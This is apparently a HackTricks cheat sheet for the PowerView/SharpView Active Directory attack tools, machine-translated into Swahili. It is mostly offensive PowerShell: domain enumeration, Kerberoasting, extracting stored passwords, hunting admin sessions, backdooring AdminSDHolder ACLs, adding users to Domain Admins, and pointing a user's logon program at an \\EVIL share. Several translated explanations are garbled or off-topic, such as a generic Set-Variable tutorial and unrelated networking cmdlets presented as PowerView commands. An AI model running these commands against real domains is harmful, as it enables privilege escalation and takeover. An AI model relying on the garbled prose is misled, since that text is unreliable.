# PowerView/SharpView

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Toleo la sasa zaidi la PowerView litakuwa daima kwenye tawi la dev la PowerSploit: [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

[**SharpView**](https://github.com/tevora-threat/SharpView) ni uhamisho wa .NET wa [**PowerView**](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

### Uchunguzi wa haraka
```powershell
Get-NetDomain #Basic domain info
#User info
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount #Basic user enabled info
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN #Kerberoastable users
#Groups info
Get-NetGroup | select samaccountname, admincount, description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName #Get AdminSDHolders
#Computers
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrainusered | select samaccountname #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth | select samaccountname #Find computers with Constrained Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
#Shares
Find-DomainShare -CheckShareAccess #Search readable shares
#Domain trusts
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
#LHF
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess
#Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
Invoke-UserHunter -CheckAccess
#Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
```
### Taarifa za Kikoa

```powershell
Get-Domain
```

Amri hii inaruhusu kupata taarifa za kikoa kama vile jina la kikoa, jina la kikoa cha msingi, na mamlaka ya kikoa.
```powershell
# Domain Info
Get-Domain #Get info about the current domain
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID

# Policy
Get-DomainPolicy #Get info about the policy
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."SystemAccess" #Password policy
Get-DomainPolicyData | select -ExpandProperty SystemAccess #Same as previous
(Get-DomainPolicy).PrivilegeRights #Check your privileges
Get-DomainPolicyData # Same as Get-DomainPolicy

# Domain Controller
Get-DomainController | select Forest, Domain, IPAddress, Name, OSVersion | fl # Get specific info of current domain controller
Get-NetDomainController -Domain mydomain.local #Get all ifo of specific domain Domain Controller

# Get Forest info
Get-ForestDomain
```
### Watumiaji, Vikundi, Kompyuta, na OU

#### Get-NetUser

Amri ya PowerShell `Get-NetUser` hutumiwa kupata habari kuhusu watumiaji wa mtandao. Inatoa maelezo kama vile jina la mtumiaji, jina kamili, SID, na maelezo mengine muhimu.

```powershell
Get-NetUser
```

#### Get-NetGroup

Amri ya PowerShell `Get-NetGroup` hutumiwa kupata habari kuhusu vikundi vya mtandao. Inatoa maelezo kama vile jina la kikundi, SID, na maelezo mengine muhimu.

```powershell
Get-NetGroup
```

#### Get-NetComputer

Amri ya PowerShell `Get-NetComputer` hutumiwa kupata habari kuhusu kompyuta za mtandao. Inatoa maelezo kama vile jina la kompyuta, SID, na maelezo mengine muhimu.

```powershell
Get-NetComputer
```

#### Get-NetOU

Amri ya PowerShell `Get-NetOU` hutumiwa kupata habari kuhusu vitengo vya shirika (OU) za mtandao. Inatoa maelezo kama vile jina la OU, SID, na maelezo mengine muhimu.

```powershell
Get-NetOU
```
```powershell
# Users
## Get usernames and their groups
Get-DomainUser -Properties name, MemberOf | fl
## Get-DomainUser and Get-NetUser are kind of the same
Get-NetUser #Get users with several (not all) properties
Get-NetUser | select samaccountname, description, pwdlastset, logoncount, badpwdcount #List all usernames
Get-NetUser -UserName student107 #Get info about a user
Get-NetUser -properties name, description #Get all descriptions
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount  #Get all pwdlastset, logoncount and badpwdcount
Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter
# Get users with reversible encryption (PWD in clear text with dcsync)
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

# Users Filters
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Get-Netuser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto #Constrained Resource Delegation
Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation
# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}
# Users with PASSWD_NOTREQD set in the userAccountControl means that the user is not subject to the current password policy
## Users with this flag might have empty passwords (if allowed) or shorter passwords
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

#Groups
Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName
## Get-DomainGroup is similar to Get-NetGroup
Get-NetGroup #Get groups
Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
Get-NetGroup 'Domain Admins' #Get all data of a group
Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl #Search admin grups
Get-NetGroup -UserName "myusername" #Get groups of a user
Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} #Get ObjectACLs by sid
Get-NetGPOGroup #Get restricted groups

# Computers
Get-DomainComputer -Properties DnsHostName # Get all domain maes of computers
## Get-DomainComputer is kind of the same as Get-NetComputer
Get-NetComputer #Get all computer objects
Get-NetComputer -Ping #Send a ping to check if the computers are working
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth #Find computers with Constrined Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups

#OU
Get-DomainOU -Properties Name | sort -Property Name #Get names of OUs
Get-DomainOU "Servers" | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties Name} #Get all computers inside an OU (Servers in this case)
## Get-DomainOU is kind of the same as Get-NetOU
Get-NetOU #Get Organization Units
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_} #Get all computers inside an OU (StudentMachines in this case)
```
### Kuingia na Vikao

#### Get-NetLoggedon

Amri ya PowerShell `Get-NetLoggedon` inatoa habari kuhusu watumiaji walioingia kwenye mfumo. Inaonyesha majina ya watumiaji, kompyuta wanayotumia, na muda wa kuingia.

#### Get-NetSession

Amri ya PowerShell `Get-NetSession` inatoa habari kuhusu vikao vya mtumiaji vilivyopo kwenye mfumo. Inaonyesha majina ya watumiaji, kompyuta wanayotumia, na muda wa kuanza kwa kikao.

#### Get-NetSession -ComputerName <ComputerName>

Unaweza kutumia amri ya PowerShell `Get-NetSession` na kipengele cha `-ComputerName` ili kupata habari za vikao vya mtumiaji kwenye kompyuta maalum.

#### Get-NetSession -ComputerName <ComputerName> | Remove-NetSession

Unaweza kutumia amri ya PowerShell `Get-NetSession` pamoja na kipengele cha `-ComputerName` na kisha kuongeza `| Remove-NetSession` ili kuondoa vikao vya mtumiaji kwenye kompyuta maalum.

#### Get-NetSession | Remove-NetSession

Unaweza kutumia amri ya PowerShell `Get-NetSession` pamoja na `| Remove-NetSession` ili kuondoa vikao vyote vya mtumiaji kwenye mfumo.
```powershell
Get-NetLoggedon -ComputerName <servername> #Get net logon users at the moment in a computer (need admins rights on target)
Get-NetSession -ComputerName <servername> #Get active sessions on the host
Get-LoggedOnLocal -ComputerName <servername> #Get locally logon users at the moment (need remote registry (default in server OS))
Get-LastLoggedon -ComputerName <servername> #Get last user logged on (needs admin rigths in host)
Get-NetRDPSession -ComputerName <servername> #List RDP sessions inside a host (needs admin rights in host)
```
### Kundi la Sera - GPOs

Ikiwa mshambuliaji ana **mamlaka ya juu juu ya GPO**, anaweza kuwa na uwezo wa **privesc** kwa kuitumia kwa **kuongeza ruhusa kwa mtumiaji**, **kuongeza mtumiaji wa admin wa ndani** kwenye mwenyeji au **kuunda kazi iliyopangwa** (moja kwa moja) kutekeleza hatua.\
Kwa [**maelezo zaidi kuhusu hilo na jinsi ya kulitumia fuata kiungo hiki**](../active-directory-methodology/acl-persistence-abuse/#gpo-delegation).
```powershell
#GPO
Get-DomainGPO | select displayName #Check the names for info
Get-NetGPO #Get all policies with details
Get-NetGPO | select displayname #Get the names of the policies
Get-NetGPO -ComputerName <servername> #Get the policy applied in a computer
gpresult /V #Get current policy

# Get who can create new GPOs
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=invented,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Enumerate permissions for GPOs where users with RIDs of > 1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Get permissions a user/group has over any GPO
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# COnvert GPO GUID to name
Get-GPO -Guid 18E5A689-E67F-90B2-1953-198ED4A7F532

# Transform SID to name
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126

# Get GPO of an OU
Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'

# Returns all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences.
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GPOType

# Enumerates the machines where a specific domain user/group is a member of a specific local group.
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
```
Jifunze jinsi ya **kutumia vibali juu ya GPOs na ACLs** katika:

{% content-ref url="../active-directory-methodology/acl-persistence-abuse/" %}
[acl-persistence-abuse](../active-directory-methodology/acl-persistence-abuse/)
{% endcontent-ref %}

### ACL
```powershell
#Get ACLs of an object (permissions of other objects over the indicated one)
Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs

#Other way to get ACLs of an object
$sid = Convert-NameToSid <username/group>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

#Get permissions of a file
Get-PathAcl -Path "\\dc.mydomain.local\sysvol"

#Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
Find-InterestingDomainAcl -ResolveGUIDs

#Check if any of the interesting permissions founds is realated to a username/group
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}

#Get special rights over All administrators in domain
Get-NetGroupMember -GroupName "Administrators" -Recurse | ?{$_.IsGroup -match "false"} | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs} | select ObjectDN, IdentityReference, ActiveDirectoryRights
```
### Picha na Folda Zilizoshirikiwa

Kuna njia kadhaa za kupata habari kuhusu faili na folda zilizoshirikiwa kwenye mtandao wa Windows. Powerview inatoa amri kadhaa za kufanya hivyo.

#### Get-NetShare

Amri ya `Get-NetShare` inatoa orodha ya folda zilizoshirikiwa kwenye mfumo wa Windows. Inatoa habari kama vile jina la folda, njia ya folda, na idadi ya watumiaji wanaoshiriki folda hiyo.

```powershell
Get-NetShare
```

#### Get-NetLoggedon

Amri ya `Get-NetLoggedon` inatoa orodha ya watumiaji walioingia kwenye mfumo wa Windows. Inatoa habari kama vile jina la mtumiaji, jina la kompyuta wanayotumia, na wakati wa kuingia.

```powershell
Get-NetLoggedon
```

#### Get-NetSession

Amri ya `Get-NetSession` inatoa orodha ya vikao vya mtandao vilivyopo kwenye mfumo wa Windows. Inatoa habari kama vile jina la mtumiaji, jina la kompyuta wanayotumia, na wakati wa kuanza kwa kikao.

```powershell
Get-NetSession
```

#### Get-NetFile

Amri ya `Get-NetFile` inatoa orodha ya faili zilizoshirikiwa kwenye mfumo wa Windows. Inatoa habari kama vile jina la faili, njia ya faili, na idadi ya watumiaji wanaoshiriki faili hiyo.

```powershell
Get-NetFile
```

#### Get-NetPrinter

Amri ya `Get-NetPrinter` inatoa orodha ya wachapishaji (printers) zilizoshirikiwa kwenye mfumo wa Windows. Inatoa habari kama vile jina la wachapishaji, njia ya wachapishaji, na idadi ya watumiaji wanaoshiriki wachapishaji hao.

```powershell
Get-NetPrinter
```

#### Get-NetConnectionProfile

Amri ya `Get-NetConnectionProfile` inatoa habari kuhusu profaili za uhusiano wa mtandao kwenye mfumo wa Windows. Inatoa habari kama vile jina la profaili, aina ya uhusiano, na hali ya uhusiano.

```powershell
Get-NetConnectionProfile
```

#### Get-NetFirewallRule

Amri ya `Get-NetFirewallRule` inatoa orodha ya sheria za firewall zilizopo kwenye mfumo wa Windows. Inatoa habari kama vile jina la sheria, hatua iliyoruhusiwa, na maelezo ya sheria.

```powershell
Get-NetFirewallRule
```

#### Get-NetOffloadGlobalSetting

Amri ya `Get-NetOffloadGlobalSetting` inatoa mazingira ya kushirikisha mzigo (offloading) ya mtandao kwenye mfumo wa Windows. Inatoa habari kama vile hali ya kushirikisha mzigo, aina ya kushirikisha mzigo, na mipangilio mingine ya kushirikisha mzigo.

```powershell
Get-NetOffloadGlobalSetting
```

#### Get-NetOffloadProfile

Amri ya `Get-NetOffloadProfile` inatoa maelezo ya kushirikisha mzigo ya profaili za mtandao kwenye mfumo wa Windows. Inatoa habari kama vile jina la profaili, aina ya kushirikisha mzigo, na mipangilio mingine ya kushirikisha mzigo.

```powershell
Get-NetOffloadProfile
```

#### Get-NetOffloadSetting

Amri ya `Get-NetOffloadSetting` inatoa maelezo ya kushirikisha mzigo ya mipangilio ya mtandao kwenye mfumo wa Windows. Inatoa habari kama vile jina la kadi ya mtandao, aina ya kushirikisha mzigo, na mipangilio mingine ya kushirikisha mzigo.

```powershell
Get-NetOffloadSetting
```
```powershell
Get-NetFileServer #Search file servers. Lot of users use to be logged in this kind of servers
Find-DomainShare -CheckShareAccess #Search readable shares
Find-InterestingDomainShareFile #Find interesting files, can use filters
```
### Uaminifu wa Kikoa

Domain Trust ni uhusiano kati ya vikoa viwili ambao huruhusu watumiaji na vifaa kutoka kikoa kimoja kupata rasilimali za kikoa kingine. Uaminifu wa kikoa unaweza kuwa wa aina tofauti, kama vile uaminifu wa moja kwa moja, uaminifu wa transitive, au uaminifu wa nusu-transitive.

#### Uaminifu wa Moja kwa Moja
Katika uaminifu wa moja kwa moja, vikoa viwili vinaweza kuaminiana moja kwa moja bila kuhitaji uaminifu kutoka kwa vikoa vingine. Hii inaruhusu watumiaji na vifaa kutoka kikoa kimoja kupata rasilimali za kikoa kingine moja kwa moja.

#### Uaminifu wa Transitive
Uaminifu wa transitive hutokea wakati vikoa vingi vina uaminifu na kila mmoja. Hii inamaanisha kuwa ikiwa kuna uaminifu kati ya Kikoa A na Kikoa B, na pia kati ya Kikoa B na Kikoa C, basi kutakuwa na uaminifu wa transitive kati ya Kikoa A na Kikoa C. Hii inaruhusu watumiaji na vifaa kutoka Kikoa A kupata rasilimali za Kikoa C kupitia Kikoa B.

#### Uaminifu wa Nusu-Transitive
Uaminifu wa nusu-transitive ni aina ya uaminifu ambapo uaminifu wa transitive unaruhusiwa kutoka kikoa kimoja kwenda kingine, lakini sio kutoka kikoa kingine kurudi kikoa cha awali. Hii inamaanisha kuwa watumiaji na vifaa kutoka Kikoa A wanaweza kupata rasilimali za Kikoa B kupitia Kikoa C, lakini sio kutoka Kikoa B kurudi Kikoa A.

Uaminifu wa kikoa ni muhimu katika mazingira ya mtandao ambapo kuna vikoa vingi na unahitaji kutoa ufikiaji wa rasilimali kati ya vikoa hivyo. Hata hivyo, inapaswa kuzingatiwa kwa uangalifu ili kuhakikisha usalama wa mtandao na kuzuia upenyezaji usiohitajika.
```powershell
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-DomainTrust #Same
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
Get-DomainTrustMapping #Enumerate also all the trusts

Get-ForestDomain # Get basic forest info
Get-ForestGlobalCatalog #Get info of current forest (no external)
Get-ForestGlobalCatalog -Forest external.domain #Get info about the external forest (if possible)
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)"

Get-NetForestTrust #Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)

Get-DomainForeingUser #Get users with privileges in other domains inside the forest
Get-DomainForeignGroupMember #Get groups with privileges in other domains inside the forest
```
### Matunda ya Chini ya Mti

Matunda ya Chini ya Mti ni hatua za kwanza na rahisi za kuchukua katika kuhakikisha usalama wa mfumo wako. Hatua hizi ni rahisi kutekeleza na mara nyingi hutoa matokeo mazuri katika kuzuia mashambulizi ya kawaida. Hapa kuna baadhi ya hatua za kuzingatia:

- Kuhakikisha kuwa programu zote zilizosakinishwa zimeboreshwa na zina matoleo ya hivi karibuni. Hii inasaidia kuziba mapungufu yoyote ya usalama ambayo yanaweza kutumiwa na wadukuzi.
- Kuweka nenosiri lenye nguvu kwa akaunti zote za mtumiaji. Nenosiri lenye nguvu linapaswa kuwa na herufi za juu na za chini, nambari, na alama za kipekee.
- Kufunga na kusanikisha programu za usalama kama vile antivirus na firewall. Programu hizi zinasaidia kugundua na kuzuia vitisho vya usalama.
- Kupunguza idadi ya akaunti za mtumiaji zilizosajiliwa kwenye mfumo wako. Kila akaunti ya mtumiaji inaleta hatari ya usalama, hivyo ni vyema kuwa na idadi ndogo ya akaunti zilizosajiliwa.
- Kufuatilia na kurekodi shughuli za mfumo ili kugundua haraka shughuli zisizo za kawaida au mashambulizi ya kudukua.
- Kufunga na kusanikisha sasisho za usalama mara kwa mara. Sasisho hizi zinajumuisha maboresho ya usalama na marekebisho ya mapungufu yaliyogunduliwa.

Kwa kuzingatia hatua hizi za msingi, unaweza kuimarisha usalama wa mfumo wako na kupunguza hatari ya kushambuliwa na wadukuzi.
```powershell
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl

#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess

#(This time you need to give the list of computers in the domain) Do the same as before but trying to execute a WMI action in each computer (admin privs are needed to do so). Useful if RCP and SMB ports are closed.
.\Find-WMILocalAdminAccess.ps1 -ComputerFile .\computers.txt

#Enumerate machines where a particular user/group identity has local admin rights
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# Enumerates the members of specified local group (default administrators)
# for all the targeted machines on the current (or specified) domain.
Invoke-EnumerateLocalAdmin
Find-DomainLocalGroupMember

#Search unconstrained delegation computers and show users
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

#Admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

#Get members from Domain Admins (default) and a list of computers
# and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host.
# If -Checkaccess, then it also check for LocalAdmin access in the hosts.
## By default users inside Domain Admins are searched
Find-DomainUserLocation [-CheckAccess] | select UserName, SessionFromName
Invoke-UserHunter [-CheckAccess]

#Search "RDPUsers" users
Invoke-UserHunter -GroupName "RDPUsers"

#It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)
Invoke-UserHunter -Stealth
```
### Vitu vilivyofutwa

Kazi ya Powerview inaweza kutumika kutambua vitu vilivyofutwa katika mfumo wa Windows Active Directory. Hii ni muhimu kwa wapenzi wa uchunguzi wa usalama na wapenzi wa uchunguzi wa uhalifu wa kompyuta. Powerview inatoa njia rahisi ya kutambua vitu vilivyofutwa kama vile watumiaji, vikundi, na vituo vya kudhibiti.

Kutumia amri ya `Get-DomainDeletedObject` inaruhusu mtumiaji kupata orodha ya vitu vilivyofutwa katika mfumo wa Active Directory. Amri hii inaweza kufanywa kwa kutumia amri ya `Get-DomainDeletedObject -Type User` ili kupata orodha ya watumiaji vilivyofutwa.

Kwa kuongeza, Powerview inatoa njia ya kurejesha vitu vilivyofutwa. Kwa kutumia amri ya `Restore-DomainObject`, mtumiaji anaweza kurejesha vitu vilivyofutwa kama vile watumiaji na vikundi. Hii inaweza kuwa muhimu katika kurejesha data iliyopotea au kufuatilia shughuli za uhalifu wa kompyuta.

Kwa ujumla, Powerview inatoa zana muhimu kwa wapenzi wa uchunguzi wa usalama na wapenzi wa uchunguzi wa uhalifu wa kompyuta kwa kutambua na kurejesha vitu vilivyofutwa katika mfumo wa Active Directory.
```powershell
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the AD Recycle Bin group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### MISC

#### SID hadi Jina

```powershell
ConvertFrom-SID -SID <SID>
```

Hii amri inatumika kubadilisha SID kuwa jina lake. Unahitaji kutoa SID kama parameter.
```powershell
"S-1-5-21-1874506631-3219952063-538504511-2136" | Convert-SidToName
```
#### Kerberoast

Kerberoast ni mbinu ya kuvunja nywila za akaunti za huduma za Active Directory (AD) ambazo hutumia itifaki ya Kerberos. Mbinu hii inategemea udhaifu katika mchakato wa kutoa tiketi za huduma za Kerberos.

Kwa kawaida, tiketi za huduma za Kerberos zinazotolewa kwa akaunti za huduma za AD zinahifadhiwa kwa kutumia algorithm ya RC4. Hii inamaanisha kuwa tiketi hizo zinaweza kuvunjwa na kuchambuliwa ili kupata nywila za akaunti hizo.

Kerberoast inaruhusu mtu mwenye ujuzi wa kutosha kuchukua tiketi za huduma za Kerberos kutoka kwa AD na kuzichambua nje ya mazingira ya AD. Kwa kufanya hivyo, wanaweza kutumia teknolojia ya GPU au CPU yenye nguvu ili kuvunja nywila hizo kwa haraka.

Mara tu nywila za akaunti zinapovunjwa, mtu huyo anaweza kuzitumia kwa madhumuni mabaya, kama kuingia kwenye mfumo au kufikia rasilimali zilizolindwa.

Ni muhimu kwa watumiaji wa AD kuchukua hatua za kuzuia Kerberoast kwa kutekeleza sera kali za nywila na kudhibiti upatikanaji wa akaunti za huduma.
```powershell
Invoke-Kerberoast [-Identity websvc] #Without "-Identity" kerberoast all possible users
```
#### Tumia vitambulisho tofauti (hoja)

Unapotumia PowerView, unaweza kutumia vitambulisho tofauti kwa kutumia hoja ya `-Credential`. Hoja hii inakuwezesha kuingiza vitambulisho vya mtumiaji tofauti ili kupata ufikiaji wa rasilimali zilizohifadhiwa. Unaweza kutumia vitambulisho hivi kwa njia ifuatayo:

```powershell
Get-NetUser -Credential $cred
```

Katika mfano huu, `$cred` inawakilisha vitambulisho vya mtumiaji. Kwa kufanya hivyo, unaweza kupata habari za mtumiaji kwa kutumia vitambulisho tofauti.
```powershell
# use an alterate creadential for any function
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred
```
#### Jifanya kuwa mtumiaji

Unapotumia PowerView, unaweza kujifanya kuwa mtumiaji mwingine kwenye mfumo. Hii inaweza kuwa muhimu katika kuchunguza mazingira na kubaini udhaifu. Unaweza kutumia amri ifuatayo:

```powershell
Invoke-UserImpersonation -Username <username>
```

Badilisha `<username>` na jina la mtumiaji unayetaka kujifanya kuwa. Kumbuka kuwa unahitaji kuwa na idhini sahihi za kufanya hivyo.
```powershell
# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf
```
#### Weka thamani

To set values in PowerShell, you can use the `Set-Variable` cmdlet. This cmdlet allows you to assign a value to a variable. The syntax is as follows:

```powershell
Set-Variable -Name <variable_name> -Value <value>
```

For example, to set the value of a variable named `$name` to "John", you would use the following command:

```powershell
Set-Variable -Name name -Value "John"
```

You can also use the assignment operator (`=`) to set values directly. For example:

```powershell
$name = "John"
```

Both methods achieve the same result of assigning a value to a variable.
```powershell
# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
# Backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
# Add user to 'Domain Admins'
Add-NetGroupUser -Username username -GroupName 'Domain Admins' -Domain my.domain.local
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
